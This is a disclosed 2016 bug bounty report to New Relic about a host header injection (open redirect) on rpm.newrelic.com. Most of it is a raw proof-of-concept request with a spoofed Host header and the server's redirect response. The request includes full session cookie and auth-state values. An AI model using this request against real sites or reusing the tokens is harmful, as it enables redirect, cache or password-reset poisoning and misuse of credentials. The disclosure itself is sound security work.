@@ -1,0 +1,61 @@
+ReportLink:https://hackerone.com/reports/167809
+WeaknessName:Open Redirect
+Reporter:https://hackerone.com/noob-boy
+ReportedTo:New Relic(newrelic)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:07.10.2016 23:03:43
+
+Summary:
+
+hello to all professionals 
+Greetings 
+i have found a host **header injection** vulnerability in your website
+
+vulnerable url :- rpm.newrelic.com  
+
+
+_the host header can be changed to something outside the target domain_
+
+
+In many cases, developers are trusting the HTTP Host header value and using it to generate links, import scripts and even generate password resets links with its value. This is a very bad idea, because the HTTP Host header can be controlled by an attacker. This can be exploited using web-cache poisoning and by abusing alternative channels like password reset emails.
+
+_**Request**_
+
+GET / HTTP/1.1
+Host: google.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Cookie: _newrelic_ui_session=BAh7CkkiD3Nlc3Npb25faWQGOgZFVEkiJThiZDFiZWEzM2U3OGU0M2EwOTU0ODFjNTg0NTc3NThhBjsAVEkiDnJldHVybl90bwY7AEZJIgYvBjsAVEkiFG9tbmlhdXRoLnBhcmFtcwY7AFR7BkkiC29yaWdpbgY7AFRJIgYvBjsAVEkiFG9tbmlhdXRoLm9yaWdpbgY7AFRADUkiE29tbmlhdXRoLnN0YXRlBjsAVEkiNTc1NDg2YWVhMmY3ZDQ0YWNhZDRjYmVjYWQwYTNlMWE5MGQ3NmEyMTUzN2NmMzFiNQY7AEY%3D--f0cca1fdfe309ecec33ba82a5107fa58fce25fb0; omniauth.states=%5B%2275486aea2f7d44acad4cbecad0a3e1a90d76a21537cf31b5%22%5D; _ga=GA1.2.340892731.1473678578; __utma=256421704.340892731.1473678578.1473678659.1473701593.2; __utmc=256421704; __utmz=256421704.1473678659.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=256421704.2.10.1473701593; __utmt=1
+Connection: keep-alive
+If-None-Match: "d741389d365bc233160a0a80f5f3e527"
+Cache-Control: max-age=0
+
+
+**_Response_**
+
+HTTP/1.1 302 Found
+Server: nginx
+Date: Mon, 12 Sep 2016 17:58:21 GMT
+Content-Type: text/html; charset=utf-8
+Connection: Keep-Alive
+Status: 302 Found
+Location: https://google.com/login?return_to=%2F
+X-UA-Compatible: IE=Edge,chrome=1
+Cache-Control: no-cache, private
+Set-Cookie: saml_login_path=; path=/; expires=Thu, 01-Jan-1970 00:00:00 GMT
+Set-Cookie: timeout_feature_enabled=; path=/; expires=Thu, 01-Jan-1970 00:00:00 GMT
+X-Request-Id: ab122da0be05a78774201b1d2d636035
+X-Runtime: 0.009542
+X-Rack-Cache: miss
+Vary: Accept-Encoding
+Content-Length: 104
+
+<html><body>You are being <a href="https://google.com/login?return_to=%2F">redirected</a>.</body></html>
+
+_the PoC video & screenshots are under attached_
+
+i hope you will reply me soon and patch this bug soon
